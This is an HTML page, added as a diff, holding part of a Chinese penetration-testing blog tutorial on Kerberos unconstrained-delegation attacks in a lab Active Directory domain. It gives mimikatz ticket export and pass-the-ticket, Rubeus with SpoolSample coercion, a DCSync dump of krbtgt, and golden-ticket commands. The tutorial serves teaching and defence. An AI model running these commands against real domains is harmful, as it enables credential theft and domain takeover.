@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/ad_delegation.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="域渗透-委派攻击原理与实战 - F0rmat&#39;s Blog">
+    <meta property="og:title" content="域渗透-委派攻击原理与实战 - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="域渗透-委派攻击原理与实战 - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 前言 在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerb">
+    <meta property="og:description" content="0x00 前言 在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerb">
+    <meta property="twitter:description" content="0x00 前言 在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerb">
+    <meta property="og:type" content="article">
+    <title>域渗透-委派攻击原理与实战 - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/ad_delegation.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/ad_delegation.html" title="域渗透-委派攻击原理与实战">域渗透-委派攻击原理与实战</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2022-03-03 11:04:34 CST">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 03 Mar 2022
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            13405 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            27 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-非约束委派">0x01 非约束委派</a>
+      <ul>
+        <li><a href="#环境">环境</a></li>
+        <li><a href="#实战">实战</a></li>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#发现非约束委派信息">发现非约束委派信息</a>
+          <ul>
+            <li><a href="#adfind">AdFind</a></li>
+            <li><a href="#powerview">PowerView</a></li>
+            <li><a href="#finddelegationpy">findDelegation.py</a></li>
+            <li><a href="#ldapsearch">ldapsearch</a></li>
+          </ul>
+        </li>
+        <li><a href="#非约束委派spooler打印机">非约束委派+spooler打印机</a>
+          <ul>
+            <li><a href="#环境部署">环境部署</a></li>
+            <li><a href="#实战-1">实战</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x02-约束委派">0x02 约束委派</a>
+      <ul>
+        <li><a href="#环境-1">环境</a></li>
+        <li><a href="#实战-主机账户">实战-主机账户</a></li>
+        <li><a href="#实战-服务账号生成黄金票据">实战-服务账号（生成黄金票据）</a>
+          <ul>
+            <li><a href="#kekeo">kekeo</a></li>
+            <li><a href="#impacket">Impacket</a></li>
+          </ul>
+        </li>
+        <li><a href="#原理-1">原理</a></li>
+        <li><a href="#发现约束委派信息">发现约束委派信息</a>
+          <ul>
+            <li><a href="#adfind-1">AdFind</a></li>
+            <li><a href="#powerview-1">PowerView</a></li>
+            <li><a href="#inddelegationpy">indDelegation.py</a></li>
+            <li><a href="#ldapsearch-1">ldapsearch</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x03-基于资源的约束委派rbcd">0x03 基于资源的约束委派（RBCD）</a>
+      <ul>
+        <li><a href="#原理-2">原理</a></li>
+        <li><a href="#查找可控的机器">查找可控的机器</a>
+          <ul>
+            <li><a href="#adfind-2">AdFind</a></li>
+            <li><a href="#powerview-2">Powerview</a></li>
+          </ul>
+        </li>
+        <li><a href="#实战-2">实战</a>
+          <ul>
+            <li><a href="#利用条件">利用条件</a></li>
+            <li><a href="#环境-2">环境</a></li>
+            <li><a href="#情景一">情景一</a></li>
+            <li><a href="#情景二">情景二</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x04-防御措施">0x04 防御措施</a></li>
+    <li><a href="#0x05-结尾">0x05 结尾</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x00-前言">0x00 前言</h1>
+<p>在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerberos向Web Server进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为“ Kerberos双跳问题”，并且要求进行委派，以便Web Server在修改数据库记录时模拟用户。</p>
+<p>域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深度隐藏的后门域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
+<p>域委派是指：将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是<strong>主机账户</strong>，另一种是<strong>服务账户</strong>(域用户通过注册SPN也可以成为服务账号)。</p>
+<p>服务账号可以看另外一篇文章了解：<a href="https://xxe.icu/posts/ad_spn/">域渗透-SPN</a></p>
+<p>Kerberos委派主要分为三种：</p>
+<ul>
+<li>非约束委派(Unconstrained Delegation)</li>
+<li>约束委派(Constrained Delegation)</li>
+<li>基于资源的约束委派(Resource-Based Constrained Delegation)</li>
+</ul>
+<p>本文先实战后理论，因为我在学习相关的知识的时候，这里面的理论特别，而且复杂。采用先实战的方式，让大家先感受这个技术在实战当中的利用方式和影响，对后面了解理论的时候就没那么枯燥。</p>
+<h1 id="0x01-非约束委派">0x01 非约束委派</h1>
+<p>非约束委派的攻击方法中有两种：</p>
+<ol>
+<li>设置主机账户为非约束委派，通过域管理账户对该主机账户进行访问，留下票据在该主机账户下，然后拿该票据去写入内存，从而可以利用域管理的TGT去访问域控。</li>
+<li>设置服务账号为非约束委派，通过域管理账户对该服务进行访问，留下票据在该主机账户下，然后拿该票据去写入内存，从而可以利用域管理的TGT去访问域控。（实践后这种无论是通过HTTP或者MSSQL服务的kerberos都不会留下票据在该主机）</li>
+</ol>
+<p>而且通过文章<a href="https://www.anquanke.com/post/id/92484#h3-3">利用域委派获取域管理权限</a>中的的非约束服务账号的攻击也是没有办法复现（貌似这种方法是约束派的攻击，不知道是不是笔者笔误导致的）</p>
+<p>原文段落描述：<code>由于sqlsvc被设置为非约束性委派，因此可以利用刚才伪造的sqlsvc票据，向域服务器发起申请访问域服务器service 1服务的管理员权限的TGS的命令。</code></p>
+<h2 id="环境">环境</h2>
+<p>域：hack.lab</p>
+<p>域控服务器：172.16.0.106     域管理用户：dc_admin  域控主机名：dc</p>
+<p>域内主机：172.16.0.105     本地管理员：sc92n  域控主机名：win7a</p>
+<p>我们要配置一下域内主机win7a的主机账户为非约束委派，我们先在域控172.16.0.106上面操作：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/1.png" alt="1"></p>
+<p>这样我们的实验环境就基本完成了，下面就开始实战攻击。</p>
+<h2 id="实战">实战</h2>
+<p>我们在域控服务器上使用域管理员dc_admin对win7a进行远程文件访问(service 1服务)：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/2.png" alt="2"></p>
+<p>现在我们再来到win7a上面，使用本地管理员sc92n启动<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>工具导出票据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sekurlsa::tickets /export
+</span></span></code></pre></div><p>执行后会在当前目录生成域管理员的TGT票据：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/3.png" alt="3"></p>
+<p>我们现在只需要把该票据导入内存即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::ptt dc_admin@krbtgt-HACK.LAB.kirbi
+</span></span></code></pre></div><p>导入后我们从win7a主机就能访问域控dc上面的文件了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/4.png" alt="4"></p>
+<p>如果想执行命令，可以使用WinRM服务来远程连接域控服务器，Windows Server 2012及以上默认是开启WinRM服务的。</p>
+<p>Windows Server 2008 R2需要执行以下命令开启WinRM服务：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">winrm quickconfig -q
+</span></span></code></pre></div><blockquote>
+<p>这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的</p>
+</blockquote>
+<p>我们使用powerhsell执行以下命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Enter-PSSession -ComputerName DC
+</span></span></code></pre></div><blockquote>
+<p>-ComputerName指定主机名
+如果WinRM服务端口改了的话，可以用-Port指定WinRM端口，默认是5985</p>
+</blockquote>
+<p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/5.png" alt="5"></p>
+<h2 id="原理">原理</h2>
+<p>服务(如<code>WIN7A</code>) 被配置了非约束的委派，那么<code>WIN7A</code>可以接受任何用户的委派的去请求其他所有服务。在协议层面的实现就是，某个用户委托<code>WIN7A</code>去访问某个服务，那么这个用户会将 TGT（在TGS里面）发送到<code>WIN7A</code>并缓存到LSASS中，以方便以后使用。 然后<code>WIN7A</code>模拟用户去请求某个服务。</p>
+<p>相信大家都在很多文章中看到下面这张图，是来自微软官方：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/6.png" alt="6"></p>
+<p>主要的流程如下：</p>
+<ol>
+<li>用户(dc_admin)通过发送 KRB_AS_REQ 消息向密钥分发中心 (KDC) 进行身份验证，该消息是身份验证服务 (AS) 交换中的请求消息，并请求可转发的 TGT。</li>
+<li>KDC 在 KRB_AS_REP 消息中返回一个可转发的 TGT，这是身份验证服务 (AS) 交换中的响应消息。</li>
+<li>用户(dc_admin)根据步骤 2 中的可转发 TGT 请求转发 TGT,这是通过 KRB_TGS_REQ 消息完成的。</li>
+<li>KDC 在 KRB_TGS_REP 消息中为用户(dc_admin)返回一个转发的 TGT。</li>
+<li>用户(dc_admin)使用步骤 2 中返回的 TGT 向服务 1(service 1/WIN7A) 请求服务票证。这是通过 KRB_TGS_REQ 消息完成的。</li>
+<li>票证授予服务 (TGS) 在 KRB_TGS_REP 中返回服务票证。</li>
+<li>用户通过发送 KRB_AP_REQ 消息向服务 1(service 1) 发出请求，提供服务票证(ST)、转发的 TGT 和转发的 TGT 的会话密钥。</li>
+<li>为了满足用户(dc_admin)的请求，服务 1 (service 1) 需要服务 2 (其他服务)代表用户执行一些操作，服务 1 使用转发的用户 TGT 并将其以 KRB_TGS_REQ 的形式发送到 KDC，以用户的名义请求服务 2 的票证。</li>
+<li>KDC 在 KRB_TGS_REP 消息中将服务 2 的票证连同服务 1 可以使用的会话密钥一起返回给服务 1，票证将客户端标识为用户(dc_admin)，而不是服务 1 (service 1)。</li>
+<li>服务 1  (service 1)作为用户(dc_admin)通过 KRB_AP_REQ 向服务 2 (其他服务)发出请求。</li>
+<li>服务 2(其他服务) 响应。</li>
+<li>通过该响应，服务 1 现在可以响应用户(dc_admin)在步骤 7 中的请求。</li>
+<li>此处描述的 TGT 转发委派机制不限制服务 1 使用转发的 TGT，服务 1 可以以用户(dc_admin)的名义向 KDC 索要任何其他服务的票证。</li>
+<li>KDC 将返回请求的票证。</li>
+<li>然后，服务 1 (service 1/WIN7A)可以继续使用服务 N (其他服务)冒充用户(dc_admin)进行访问。</li>
+</ol>
+<p>下面是设置了非约束的的主机WIN7A：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/1.png" alt="1"></p>
+<p>我们在域控的ADSI 编辑器（adsiedit.msc）中查询，主机账户WIN7A属性中的一项userAccountControl：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/7.png" alt="7"></p>
+<p>这一项包含了<code>TRUSTED_FOR_DELEGATION</code>(非约束委派),对应的值是 0x80000 ，也就是 524288。为什么会显示528384呢，如果用这个数值减去524288就会得到<code>WORKSTATION_TRUST_ACCOUNT</code>的数值4096。</p>
+<p>如果设置了服务账号，减去524288，就会得到66048，因为<code>NORMAL_ACCOUNT</code> (512) + <code>DONT_EXPIRE_PASSWORD</code> (65536) = 66048。</p>
+<p>具体可以阅读文章：<a href="decoding-ad-useraccountcontrol-value">Converting UserAccountControl Attribute Values in Active Directory</a></p>
+<p>通过这个524288数值我们就可以知道怎么去查找存在非约束的主机账户或者服务账号了，下面会有介绍到。</p>
+<h2 id="发现非约束委派信息">发现非约束委派信息</h2>
+<h3 id="adfind">AdFind</h3>
+<p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">AdFind</a>工具使用LDAP协议查询域内的各种信息，下面是查询非约束委派主机账号：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="py">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=hack,DC=lab&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> <span class="n">cn</span> <span class="n">distinguishedName</span>
+</span></span></code></pre></div><p>结果如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/8.png" alt="8"></p>
+<blockquote>
+<p>域控默认设置为非约束委派</p>
+</blockquote>
+<p>如果是服务账号，执行下面的语句：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="py">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=hack,DC=lab&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> <span class="n">cn</span> <span class="n">distinguishedName</span>
+</span></span></code></pre></div><blockquote>
+<p>UserAccountControl:1.2.840.113556.1.4.803:=524288 表示在AD中所有存在非约束的账号</p>
+<p>sAMAccountType=805306369 表示在AD总的所有账号</p>
+</blockquote>
+<h3 id="powerview">PowerView</h3>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a>是PowerSploit工具包中的一款脚本，用法如下。</p>
+<p>查询非约束的主机账户：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module .\powerview.ps1;Get-NetComputer -Unconstrained -Domain hack.lab }&#34;</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/9.png" alt="9"></p>
+<p>查询非约束的服务账户：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module .\PowerView.ps1;Get-NetUser -Unconstrained -Domain hack.lab | select name }&#34;</span>
+</span></span></code></pre></div><blockquote>
+<p>最新的脚本中Get-NetUser没有 -Unconstrained参数</p>
+</blockquote>
+<h3 id="finddelegationpy">findDelegation.py</h3>
+<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py">findDelegation.py</a>是集成在impacket工具包中的一款工具，具体用法如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">findDelegation.py -dc-ip 172.16.0.106 -target-domain hack.lab hack.lab/lucky:p@ssw0rd
+</span></span></code></pre></div><p>结果如图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/10.png" alt="10"></p>
+<p>这款工具分别查询出了存在非约束的主机用户和服务用户。</p>
+<h3 id="ldapsearch">ldapsearch</h3>
+<p>这款是kali自带，可以在域外使用。</p>
+<p>查找域中配置非约束委派的主机：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://172.16.0.106:389 -D <span class="s2">&#34;CN=lucky,CN=Users,DC=hack,DC=lab&#34;</span> -w p@ssw0rd -b <span class="s2">&#34;DC=hack,DC=lab&#34;</span> <span class="s2">&#34;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> <span class="p">|</span>grep -iE <span class="s2">&#34;distinguishedName&#34;</span>
+</span></span></code></pre></div><p>结果如图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/11.png" alt="11"></p>
+<p>查找域中配置非约束委派的用户：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://172.16.0.106:389 -D <span class="s2">&#34;CN=lucky,CN=Users,DC=hack,DC=lab&#34;</span> -w p@ssw0rd -b <span class="s2">&#34;DC=hack,DC=lab&#34;</span> <span class="s2">&#34;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> <span class="p">|</span>grep -iE <span class="s2">&#34;distinguishedName&#34;</span>
+</span></span></code></pre></div><p>结果如图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/12.png" alt="12"></p>
+<h2 id="非约束委派spooler打印机">非约束委派+spooler打印机</h2>
+<p>我们都知道，高权限用户是不会主动去访问你的，除非是你拿到了web服务器这种。</p>
+<p>看到harmj0y大佬发的一篇文章<a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">The Unintended Risks of Trusting Active Directory</a></p>
+<p>可以利用域控或者其他服务器上面的spooler服务去主动访问我们的主机，这里面会用到两个工具，一个是<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>和<a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>。</p>
+<p>两个工具都需要自己去编译后使用，其实很简单的，你下个vs然后打开解决方案文件重新生成就行了。在之前的一篇文章中有写到这款工具的编译<a href="https://xxe.icu/posts/ad_as_reproasting/#rubeus">域渗透-AS_REPRoasting</a></p>
+<h3 id="环境部署">环境部署</h3>
+<p>域：hack.lab</p>
+<p>域控服务器：172.16.0.106     域管理用户：dc_admin  域控主机名：dc</p>
+<p>域内主机：172.16.0.111     本地管理员：xd32 域普通用户：tessql  域控主机名：sql</p>
+<p>我们先在域控把主机SQL开启非约束委派：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/13.png" alt="13"></p>
+<h3 id="实战-1">实战</h3>
+<p>我们整个过程都是在SQL主机上进行操作了，这里要注意一点：</p>
+<p><strong>Rubeus在本地管理员运行</strong>，因为要读取系统记录日志。</p>
+<p><strong>SpoolSample在域用户下运行</strong>，要不然你无法使用MS-RPRN协议进行通信。</p>
+<p>我们在本地管理员xd32下使用管理员模式打开cmd，输入我们要监控的域控名称：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe monitor /interval:1 /filteruser:dc$
+</span></span></code></pre></div><p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/14.png" alt="14"></p>
+<p>好了，现在我们再在SQL主机登录另外一个用户，也就是域用户testsql，启动SpoolSample，输入域控名和非约束委派的主机名：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SpoolSample.exe dc sql
+</span></span></code></pre></div><p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/15.png" alt="15"></p>
+<p>我们再换回本地管理员，已经捕获到了域控的TGT了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/16.png" alt="16"></p>
+<p>这个TGT是base64位的，我们有两种方法去导入内存。</p>
+<p>注意一下在cmd中复制出来的字符，可以参考文章使用notepad++操作：<a href="https://blog.csdn.net/zhengxinjian_2009/article/details/70763544">Notepad++中查找替换回车符</a></p>
+<p>方法一：</p>
+<p>使用powershell的base64转换功能：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="no">IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">&#34;dc.kirbi&#34;</span><span class="p">,[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">&#34;捕获到的base64编码&#34;</span><span class="p">))</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/18.png" alt="18"></p>
+<p>它会在当前目录下生成<code>dc.kirbi</code>文件，现在我们直接用mimikatz导入票据即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::ptt dc.kirbi
+</span></span></code></pre></div><p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/17.png" alt="17"></p>
+<p>方法二：</p>
+<p>使用Rubeus工具直接把base64字符串导入票据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe ptt /ticket:base64
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/19.png" alt="19"></p>
+<p>我们再用mimikatz导出票据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::tickets /export
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/20.png" alt="20"></p>
+<p>然后在mimikatz把票据写入内存：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::ptt [0;965be]-2-0-60a10000-DC$@krbtgt-HACK.LAB.kirbi
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/21.png" alt="21"></p>
+<p>我们已经有了域控的TGT，就可以使用mimikatz的dcsync功能导出krbtgt的hash来制作黄金票据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lsadump::dcsync /domain:hack.lab /user:hack\krbtgt
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/22.png" alt="22"></p>
+<p>黄金票据可以在另外一篇文章进行了解：<a href="https://xxe.icu/posts/ad_ptt/#0x03-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEgolden-ticket">域渗透-票据传递攻击</a></p>
+<p>记录一下krbtgt的sid和ntlm hash：</p>
+<p>sid：S-1-5-21-3896163557-1645138957-2306563325</p>
+<p>ntlm hash：79f9b4b4e9ffced451fb812cac908bb6</p>
+<p>下面就开始用mimikatz来制作黄金票据：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /krbtgt:79f9b4b4e9ffced451fb812cac908bb6 /user:fakeuser /ptt
+</span></span></code></pre></div><p>制作完成就可以访问dc服务器了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/23.png" alt="23"></p>
+<h1 id="0x02-约束委派">0x02 约束委派</h1>
+<p>有非约束委派那肯定就有约束委派啦，微软很早就意识到非约束委派并不是特别安全，在 Windows 2003上发布了&quot;约束&quot;委派。 其中包括一组 Kerberos 协议扩展，就是本文到的两个扩展 S4U2Self 和 S4U2Proxy。</p>
+<p>配置它后，约束委派将限制指定服务器可以代表用户执行的服务。这需要域管理员特权(其实严谨一点是SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员)才能为服务配置域帐户，并且将帐户限制为单个域。</p>
+<p>好了，我们先开始实战再讨论其中的原理。</p>
+<h2 id="环境-1">环境</h2>
